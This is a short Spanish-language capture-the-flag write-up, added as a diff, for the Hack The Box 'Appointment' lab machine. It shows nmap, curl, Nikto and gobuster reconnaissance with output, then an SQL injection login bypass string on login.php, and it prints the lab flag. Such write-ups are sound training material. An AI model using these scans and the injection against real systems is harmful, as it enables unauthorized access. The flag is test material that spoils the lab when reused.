@@ -1,0 +1,65 @@
+##Conectados ya a la red de la máquina víctima..
+ ## WhichSystem
+
+[*] 10.129.36.232 (ttl -> 63): Linux
+
+## NMAP
+# Descubramos puertos y servicios en la máquina objetivo
+
+nmap --open -sS -p- -sCV -n -Pn -vvv 10.129.36.232 -oG escaneoNmap
+
+#Encontramos en este caso el puerto 80 con protocolo TCP
+
+
+#Probamos entrar a http://10.129.36.232/80 con nuestro navegador
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Login
+|_http-server-header: Apache/2.4.38 (Debian)
+
+#Revisemos los encabezados HTTP
+
+curl -I 10.129.36.232
+
+HTTP/1.1 200 OK
+Date: Sat, 25 Jan 2025 22:51:15 GMT
+Server: Apache/2.4.38 (Debian)
+Content-Type: text/html; charset=UTF-8
+
+#Aquí jugamos con Nikto por curiosidad
+  pwn3r   ~/Desktop/HTB/Appointment  nikto -h http://10.129.36.232
+
++ Target IP:          10.129.36.232
++ Target Hostname:    10.129.36.232
++ Target Port:        80
++ Start Time:         2025-01-25 19:53:18 (GMT-3)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
+^[[A+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.0.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
++ Apache/2.4.38 appears to be outdated (current is at least 2.4.57). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /css/: Directory indexing found.
++ /css/: This might be interesting.
+
+##Cancelamos el proceso porque iremos por otro lado.
+
+##BRUTE FORCE
+##Gobuster, Dirbuster, Dirb
+
+gobuster dir -u http://10.129.36.32/80 -w /usr/share/diccionarioqueutilizamos
+
+Encontramos varias rutas, entre ellas 
+http://10.129.36.232/login.php 
+
+El cual era vulnerable a inyección SQL por lo que en este caso, basto con probar:
+
+' OR 1=1-- 
+
+Para obtener la flag: e3d0796d002a446c0e622226f42e9672
+
+
+                               
